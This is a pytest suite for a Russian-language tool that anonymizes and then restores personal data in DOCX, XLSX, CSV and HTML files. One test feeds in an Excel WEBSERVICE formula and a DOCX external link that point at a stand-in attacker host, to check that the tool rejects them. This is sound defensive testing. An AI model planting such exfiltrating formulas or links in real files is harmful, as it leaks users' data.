import os
import sys
import shutil
import json
import zipfile
from pathlib import Path
import pytest

# Добавляем src в PYTHONPATH
src_dir = Path(__file__).parent.parent / 'src'
sys.path.insert(0, str(src_dir))

from docx import Document
from docx.opc.constants import RELATIONSHIP_TYPE as RT
from doc_processor import DocumentProcessor
from nlp_engine import NLPProcessor

def create_test_docx(path):
    doc = Document()
    doc.add_heading('Договор оказания услуг', 0)
    p = doc.add_paragraph('г. Москва, ')
    p.add_run('14 июля 2026 г.').bold = True
    
    doc.add_paragraph('ООО "Рога и Копыта" в лице генерального директора Иванова Ивана Ивановича, с одной стороны, и Microsoft Corporation, с другой стороны, заключили договор.')
    
    table = doc.add_table(rows=2, cols=2)
    table.cell(0, 0).text = 'Услуга'
    table.cell(0, 1).text = 'Стоимость'
    table.cell(1, 0).text = 'Разработка ПО'
    table.cell(1, 1).text = '150 000,00'
    
    doc.save(path)

def test_e2e_anonymize_deanonymize(tmp_path):
    # Подготавливаем тестовый файл
    test_file = tmp_path / 'test.docx'
    create_test_docx(str(test_file))
    
    # Меняем текущую директорию на src, чтобы nlp_engine нашел модели
    os.chdir(str(src_dir))
    
    # Анонимизация
    nlp = NLPProcessor()
    processor = DocumentProcessor(nlp)
    # process_file сохраняет anon-файл рядом.
    result = processor.process_file(str(test_file), export_md=True)
    anon_path = result[0] if isinstance(result, tuple) else result
    
    assert os.path.exists(anon_path)
    assert anon_path.endswith('.md')
    
    # Читаем MD, симулируем ответ ИИ (ничего не меняли)
    with open(anon_path, 'r', encoding='utf-8') as f:
        md_text = f.read()
    
    assert '[ФИО_1]' in md_text
    assert '[ОРГАНИЗАЦИЯ_1]' in md_text

    # ГЛАВНАЯ проверка продукта: в файле, уходящем ИИ, НЕ должно остаться НИ ОДНОЙ
    # исходной единицы ПДн. Раньше её не было — регрессия, при которой имя утекает
    # в «обезличенный» md, проходила тест зелёной (см. аудит).
    for leaked in ('Иванова Ивана Ивановича', 'Иванов Иван Иванович',
                   'Microsoft Corporation', 'Рога и Копыта', '150 000,00'):
        assert leaked not in md_text, f'ПДн утекли в [ANON].md: {leaked!r}'

    # Английское название организации должно быть замаскировано (прежнее «ИЛИ»
    # всегда удовлетворялось русской компанией и Microsoft не проверяло вовсе).
    assert '[ОРГАНИЗАЦИЯ_2]' in md_text or '[ОРГАНИЗАЦИЯ_3]' in md_text
    assert '[СУММА_1]' in md_text or '[СУММА_2]' in md_text
    
    # Деанонимизация (md_text + оригинал)
    session = processor.deanonymize_file(anon_path, str(test_file))
    session.save()
    deanon_path = session.out_path
    
    assert os.path.exists(deanon_path)
    
    # Проверяем, что реальные данные вернулись
    doc = Document(deanon_path)
    full_text = '\n'.join([p.text for p in doc.paragraphs])
    for table in doc.tables:
        for row in table.rows:
            for cell in row.cells:
                full_text += '\n' + cell.text
                
    assert 'Иванова Ивана Ивановича' in full_text
    assert 'Microsoft Corporation' in full_text
    assert '150 000,00' in full_text
    assert '[ФИО_1]' not in full_text

def test_detectors_hide_pii():
    """Регрессия на детекторы, которые раньше пропускали ПДн (см. аудит)."""
    os.chdir(str(src_dir))
    nlp = NLPProcessor()
    expected = {
        'e-mail: ivanov@почта.рф': '[EMAIL]',            # кириллический домен (IDN)
        'тел. (495) 123-45-67': '[ТЕЛЕФОН]',             # городской формат
        'звоните 123-45-67': '[ТЕЛЕФОН]',                # без кода страны
        'паспорт 4509 123456': '[ПАСПОРТ]',              # без слова «серия»
        'Страховое свидетельство: 112-233-445 95': '[СНИЛС]',  # синоним СНИЛС
        'Дата рождения: 15.06.1985': '[ДР]',             # обратный порядок
    }
    for text, tag in expected.items():
        out = nlp.anonymize_text(text)
        assert tag in out, f'{text!r} -> {out!r} (ждали {tag})'

    # Даты НЕ должны дробиться в [СУММА].YYYY (over-anon).
    dt = nlp.anonymize_text('Договор от 27.07.2006, срок до 31.12.2026.')
    assert '27.07.2006' in dt and '31.12.2026' in dt and '[СУММА' not in dt

    # «ГК РФ» — указание права, не адрес: должно сохраниться.
    assert 'ГК РФ' in nlp.anonymize_text('Согласно ст. 431 ГК РФ.')


def test_xlsx_numeric_and_comment(tmp_path):
    """ИНН/телефон, сохранённые как ЧИСЛО, и текст примечания к ячейке — тоже ПДн."""
    os.chdir(str(src_dir))
    import openpyxl
    from openpyxl.comments import Comment
    nlp = NLPProcessor()
    proc = DocumentProcessor(nlp)
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = 'Клиент Иванов'
    ws['A1'] = 7707083893                 # ИНН как число
    ws['A2'] = 5                          # короткое число — не ПДн, не трогаем
    ws['B1'].comment = Comment('Клиент Петров, ИНН 7707083893', 'Сидоров')
    src = tmp_path / 'reestr.xlsx'
    wb.save(str(src))

    out = proc.process_file(str(src))
    w = openpyxl.load_workbook(out).active
    assert '7707083893' not in str(w['A1'].value)
    assert w['A2'].value == 5
    assert '7707083893' not in (w['B1'].comment.text or '')
    assert w.title == 'Лист 1'


def test_underscore_label_merge_invariant(tmp_path):
    """Метки с подчёркиванием ([ИНН_ЮЛ_1]) должны быть видны инварианту слияния:
    если ИИ выкидывает клаузу с ИНН, значение берётся из оригинала, а не теряется."""
    os.chdir(str(src_dir))
    nlp = NLPProcessor()
    proc = DocumentProcessor(nlp)
    d = Document()
    d.add_paragraph('Реквизиты: ИНН 7701234567, КПП 770101001.')
    src = tmp_path / 'inn.docx'
    d.save(str(src))

    md_path = proc.process_file(str(src), export_md=True)
    md_text = open(md_path, encoding='utf-8').read()
    assert '[ИНН_ЮЛ_1]' in md_text

    # Симулируем ответ ИИ, который ВЫКИНУЛ клаузу с ИНН.
    ai = md_text.replace('ИНН [ИНН_ЮЛ_1], ', '')
    ans = tmp_path / 'answer.md'
    ans.write_text(ai, encoding='utf-8')

    session = proc.deanonymize_file(str(ans), str(src))
    session.save()
    full = '\n'.join(p.text for p in Document(session.out_path).paragraphs)
    assert '7701234567' in full, 'реальный ИНН потерян при деанонимизации'


def test_docx_core_properties_scrubbed(tmp_path):
    """Метаданные документа (автор/заголовок) не должны утекать в [ANON].docx."""
    os.chdir(str(src_dir))
    nlp = NLPProcessor()
    proc = DocumentProcessor(nlp)
    d = Document()
    d.core_properties.author = 'Кознова Мария Петровна'
    d.core_properties.title = 'Договор с ООО Ромашка'
    d.add_paragraph('Стороны заключили договор.')
    src = tmp_path / 'meta.docx'
    d.save(str(src))

    out = proc.process_file(str(src))
    cp = Document(out).core_properties
    assert not cp.author
    assert not cp.title


def test_roundtrip_csv_html_xlsx(tmp_path):
    """CSV/HTML становятся инертным текстом, XLSX остаётся безопасным XLSX."""
    os.chdir(str(src_dir))
    nlp = NLPProcessor()
    proc = DocumentProcessor(nlp)

    csv_src = tmp_path / 'd.csv'
    csv_src.write_text('Клиент,Телефон\nИванов Иван Иванович,+7 (495) 123-45-67\n',
                       encoding='utf-8')
    csv_anon = proc.process_file(str(csv_src))
    assert csv_anon.endswith('.txt')
    out, stats = proc.deanonymize_file(csv_anon, str(csv_src))
    assert 'Иванов Иван Иванович' in open(out, encoding='utf-8').read()
    assert stats['restored'] > 0

    html_src = tmp_path / 'd.html'
    html_src.write_text('<p>Директор Петров Пётр Петрович</p>'
                        '<a href="mailto:p@corp.ru">x</a>', encoding='utf-8')
    html_anon = proc.process_file(str(html_src))
    assert html_anon.endswith('.txt')
    assert 'mailto:' not in open(html_anon, encoding='utf-8').read()
    out, stats = proc.deanonymize_file(html_anon, str(html_src))
    restored = open(out, encoding='utf-8').read()
    assert 'Петров Пётр Петрович' in restored
    assert 'p@corp.ru' not in restored  # скрытые атрибуты намеренно отбрасываются

    import openpyxl
    wb = openpyxl.Workbook()
    wb.active['A1'] = 'Сидоров Сидор Сидорович'
    xlsx_src = tmp_path / 'd.xlsx'
    wb.save(str(xlsx_src))
    out, stats = proc.deanonymize_file(proc.process_file(str(xlsx_src)), str(xlsx_src))
    assert openpyxl.load_workbook(out).active['A1'].value == 'Сидоров Сидор Сидорович'


def test_manifest_binds_unchanged_original_without_pii(tmp_path):
    os.chdir(str(src_dir))
    proc = DocumentProcessor(NLPProcessor())
    source = tmp_path / 'person.txt'
    source.write_text('Иванов Иван Иванович, ivanov@example.org', encoding='utf-8')
    anon = proc.process_file(str(source))
    manifest_path = Path(anon + '.umbra.json')
    data = json.loads(manifest_path.read_text(encoding='utf-8'))
    serialized = manifest_path.read_text(encoding='utf-8')
    assert data['schema'] == 1
    assert 'mapping' not in data
    assert 'Иванов' not in serialized and 'ivanov@example.org' not in serialized

    source.write_text('Иванов Иван Иванович, изменено', encoding='utf-8')
    with pytest.raises(ValueError, match='паспорт'):
        proc.deanonymize_file(anon, str(source))


def test_active_and_opaque_content_rejected(tmp_path):
    os.chdir(str(src_dir))
    proc = DocumentProcessor(NLPProcessor())

    old_doc = tmp_path / 'legacy.doc'
    old_doc.write_bytes(b'not opened')
    with pytest.raises(ValueError, match=r'\.doc отключён'):
        proc.process_file(str(old_doc))

    workbook_path = tmp_path / 'formula.xlsx'
    import openpyxl
    workbook = openpyxl.Workbook()
    workbook.active['A1'] = '=WEBSERVICE("https://attacker.invalid/")'
    workbook.save(workbook_path)
    with pytest.raises(ValueError, match='Формулы Excel'):
        proc.process_file(str(workbook_path))

    docx_path = tmp_path / 'embedded.docx'
    Document().save(docx_path)
    with zipfile.ZipFile(docx_path, 'a') as archive:
        archive.writestr('word/media/private.txt', 'Иванов Иван Иванович')
    with pytest.raises(ValueError, match='вложения'):
        proc.process_file(str(docx_path))

    linked_path = tmp_path / 'linked.docx'
    linked = Document()
    linked.add_paragraph('Безопасный видимый текст')
    linked.part.relate_to('https://attacker.invalid/collect', RT.HYPERLINK,
                          is_external=True)
    linked.save(linked_path)
    with pytest.raises(ValueError, match='внешнюю ссылку'):
        proc.process_file(str(linked_path))


def test_ner_failure_stops_anonymization(tmp_path, monkeypatch):
    os.chdir(str(src_dir))
    nlp = NLPProcessor()
    proc = DocumentProcessor(nlp)
    source = tmp_path / 'person.txt'
    source.write_text('Иванов Иван Иванович', encoding='utf-8')

    def broken(_text):
        raise RuntimeError('NER unavailable')

    monkeypatch.setattr(nlp, '_ner_markup', broken)
    with pytest.raises(RuntimeError, match='NER unavailable'):
        proc.process_file(str(source))
    assert not (tmp_path / 'person [ANON].txt').exists()


def test_existing_output_is_not_overwritten(tmp_path):
    os.chdir(str(src_dir))
    proc = DocumentProcessor(NLPProcessor())
    source = tmp_path / 'person.txt'
    source.write_text('Телефон +7 999 123-45-67', encoding='utf-8')
    first = proc.process_file(str(source))
    first_bytes = Path(first).read_bytes()
    second = proc.process_file(str(source))
    assert second != first
    assert Path(first).read_bytes() == first_bytes
    assert Path(second).exists()


def test_text_dates_and_long_list_numbering(tmp_path):
    os.chdir(str(src_dir))
    proc = DocumentProcessor(NLPProcessor())
    source = tmp_path / 'dates.txt'
    source.write_text('Подписано 14.07.2026.', encoding='utf-8')
    anon = proc.process_file(str(source), hide_dates=True)
    assert '[ДАТА_1]' in Path(anon).read_text(encoding='utf-8')

    from md_serializer import _fmt_number
    assert _fmt_number(27, 'lowerLetter') == 'aa'
    assert _fmt_number(27, 'upperLetter') == 'AA'


def test_clipboard_extract_text_covers_output_formats(tmp_path):
    """extract_text должен давать текст для ВСЕХ форматов результата — иначе на
    Mac/Linux копировать нечего."""
    os.chdir(str(src_dir))
    import clipboard_util

    csv_p = tmp_path / 'a.csv'
    csv_p.write_text('Имя,Телефон\n[ФИО_1],[ТЕЛЕФОН_1]\n', encoding='utf-8')
    assert '[ФИО_1]' in clipboard_util.extract_text(str(csv_p))

    html_p = tmp_path / 'a.html'
    html_p.write_text('<p>[ФИО_1]</p>', encoding='utf-8')
    assert '[ФИО_1]' in clipboard_util.extract_text(str(html_p))

    import openpyxl
    wb = openpyxl.Workbook()
    wb.active['A1'] = '[ФИО_1]'
    xlsx_p = tmp_path / 'a.xlsx'
    wb.save(str(xlsx_p))
    assert '[ФИО_1]' in clipboard_util.extract_text(str(xlsx_p))


def test_copy_result_does_not_fake_success(tmp_path, monkeypatch):
    """На Mac/Linux, когда копировать нечего, copy_result обязан вернуть False:
    раньше он возвращал True, и GUI показывал «Скопировано» над пустым буфером."""
    os.chdir(str(src_dir))
    import clipboard_util
    monkeypatch.setattr(clipboard_util.sys, 'platform', 'linux')

    unknown = tmp_path / 'result.bin'   # формат без извлекаемого текста
    unknown.write_bytes(b'binary')
    assert clipboard_util.copy_result(str(unknown), tk_master=None) is False


if __name__ == '__main__':
    # Запуск тестов
    import pytest
    pytest.main([__file__])
